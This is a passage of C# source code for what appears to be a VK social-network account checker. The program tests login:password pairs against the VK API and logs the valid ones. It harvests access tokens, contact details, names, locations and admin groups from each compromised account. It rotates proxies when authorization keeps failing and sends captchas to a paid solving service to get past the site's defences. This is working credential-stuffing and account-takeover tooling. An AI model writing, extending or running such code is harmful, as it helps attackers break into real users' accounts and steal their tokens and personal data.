                    var subs = api.Users.GetFollowers(api.UserId.Value, default, default, ProfileFields.FirstName, default);
                    dbAccount.PhoneNumber = Regex.IsMatch(login, @"^((8|\+374|\+994|\+995|\+375|\+7|\+380|\+38|\+996|\+998|\+993|7|374|994|995|375|380|38|996|998|993)[\- ]?)?\(?\d{3,5}\)?[\- ]?\d{1}[\- ]?\d{1}[\- ]?\d{1}[\- ]?\d{1}[\- ]?\d{1}(([\- ]?\d{1})?[\- ]?\d{1})?$")
                        ? login : "?";
                    dbAccount.Email = Regex.IsMatch(login, @"^([\w\.\-]+)@([\w\-]+)((\.(\w){2,3})+)$") ? login : "?";
                    dbAccount.Login = login;
                    dbAccount.Password = password;

                    dbAccount.AdditionalInfo.City = accInfo.City != null ? accInfo.City.Title : "";
                    dbAccount.AdditionalInfo.Country = accInfo.Country != null ? accInfo.Country.Title : "";
                    dbAccount.AdditionalInfo.ErrorType = "OK";
                    dbAccount.AdditionalInfo.FriendsCount = Convert.ToInt32(friends.TotalCount);
                    dbAccount.AdditionalInfo.Gender = accInfo.Sex == VkNet.Enums.Sex.Male ? Gender.Male : Gender.Female;
                    dbAccount.AdditionalInfo.HasPhoto = accInfo.HasPhoto == true;
                    dbAccount.AdditionalInfo.IsBanned = accInfo.IsDeactivated;
                    dbAccount.AdditionalInfo.Name = accInfo.FirstName ?? "";
                    dbAccount.AdditionalInfo.Surname = accInfo.LastName ?? "";
                    dbAccount.AdditionalInfo.SubsCount = Convert.ToInt32(subs.TotalCount);
                    dbAccount.AdditionalInfo.Token = api.Token ?? "";
                    dbAccount.AdditionalInfo.Url = $"https://vk.com/id{accInfo.Id}";

                    dbAccount.AdditionalInfoStr = "";
                    try
                    {
                        var groups = api.Groups.Get(new VkNet.Model.RequestParams.GroupsGetParams() { Filter = GroupsFilters.Moderator, Extended = false });
                        dbAccount.AdditionalInfo.AdminGroups = groups.ToList().Select(x => x.Id).ToList();
                        if (programSettings.settingsInfo.additionalFields.AdminGroups == true)
                            dbAccount.AdditionalInfoStr += $"AdmGroups: {groups.TotalCount}, ";
                    }
                    catch { }

                    if (programSettings.settingsInfo.additionalFields.City == true)
                        dbAccount.AdditionalInfoStr += $"Location: {dbAccount.AdditionalInfo.City},{dbAccount.AdditionalInfo.Country}, ";
                    if (programSettings.settingsInfo.additionalFields.ErrorType == true)
                        dbAccount.AdditionalInfoStr += $"Error: None, ";
                    if (programSettings.settingsInfo.additionalFields.FriendsCount == true)
                        dbAccount.AdditionalInfoStr += $"Friends: {dbAccount.AdditionalInfo.FriendsCount}, ";
                    if (programSettings.settingsInfo.additionalFields.SubsCount == true)
                        dbAccount.AdditionalInfoStr += $"Subs: {dbAccount.AdditionalInfo.SubsCount}, ";
                    if (programSettings.settingsInfo.additionalFields.Gender == true)
                        dbAccount.AdditionalInfoStr += $"Sex: {(dbAccount.AdditionalInfo.Gender == Gender.Male ? "М" : "Ж")}, ";
                    if (programSettings.settingsInfo.additionalFields.HasPhoto == true)
                        dbAccount.AdditionalInfoStr += $"Photo: {dbAccount.AdditionalInfo.HasPhoto}, ";
                    if (programSettings.settingsInfo.additionalFields.IsBanned == true)
                        dbAccount.AdditionalInfoStr += $"Banned: {dbAccount.AdditionalInfo.IsBanned}, ";
                    if (programSettings.settingsInfo.additionalFields.Name == true)
                        dbAccount.AdditionalInfoStr += $"Name: {dbAccount.AdditionalInfo.Name} {dbAccount.AdditionalInfo.Surname}, ";
                    if (programSettings.settingsInfo.additionalFields.Token == true)
                        dbAccount.AdditionalInfoStr += $"Token: {dbAccount.AdditionalInfo.Token}, ";
                    if (programSettings.settingsInfo.additionalFields.Url == true)
                        dbAccount.AdditionalInfoStr += $"Url: {dbAccount.AdditionalInfo.Url}, ";

                    if (dbAccount.AdditionalInfoStr.Length != 0)
                        dbAccount.AdditionalInfoStr = dbAccount.AdditionalInfoStr.Remove(dbAccount.AdditionalInfoStr.Length - 2);

                    dataBase.accounts.Add(dbAccount);

                    accountsData.Add($"[+] {login}:{password}");
                    AddLog($"Valid {login}:{password}", main);
                    dataBase.validAccounts++;
                }
                catch (VkAuthorizationException)
                {
                    Capctha++;
                    if (Capctha > 10)
                    {
                        ProxyIndex++;
                        Capctha = 0;
                    }
                    if (programSettings.settingsInfo.filterInvalid == true)
                    {
                        accountsData.Add($"[X] {account}");
                        AddLog($"Invalid {account}", main);
                        dataBase.accounts.Add(new Account() { Login = account.Split(':')[0], Password = account.Split(':')[1], AdditionalInfo = new AdditionalInfo() { ErrorType = "Unknown" }, AdditionalInfoStr = "Error: Unknown" });
                    }
                    dataBase.invalidAccounts++;
                }
                catch (CaptchaNeededException)
                {
                    Solves++;
                }
                catch
                {
                    BadSolves++;
                }
                AccountsThreads++;
            }
            TotalThreads++;
        }

        private void ClearLogs_Click(object sender, RoutedEventArgs e)
        {
            LogsRb.Document.Blocks.Clear();
        }

        private void StopChecking_Click(object sender, RoutedEventArgs e)
        {
            closeVk = true;
        }

        private void ExportLogs_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.SaveFileDialog())
            {
                System.Windows.Forms.DialogResult result = dialog.ShowDialog();
                if (result == System.Windows.Forms.DialogResult.OK)
                {
                    File.WriteAllLines(dialog.FileName, new TextRange(LogsRb.Document.ContentStart, LogsRb.Document.ContentEnd).Text.Split('\n').ToList());
                }
            }
        }

        public static void AddLog(string info, MainWindow main)
        {
            main.Dispatcher.Invoke((ThreadStart)delegate
            {
                main.LogsRb.AppendText($"[{DateTime.Now.ToString("HH:mm:ss")}] " + info + "\n");
            });
        }
    }

    public class MyWebClient : WebClient
    {
        public int Timeout { get; set; }

        protected override WebRequest GetWebRequest(Uri uri)
        {
            WebRequest lWebRequest = base.GetWebRequest(uri);
            lWebRequest.Timeout = Timeout;
            ((HttpWebRequest)lWebRequest).ReadWriteTimeout = Timeout;
            return lWebRequest;
        }
    }

    public class CaptchaSolver : ICaptchaSolver
    {
        public void CaptchaIsFalse()
        {
            throw new NotImplementedException();
        }

        public string Solve(string url)
        {
            RuCaptcha.ImgCaptcha captcha = new ImgCaptcha();
            return captcha.Send(captcha.Download(url), false);
        }
    }

}
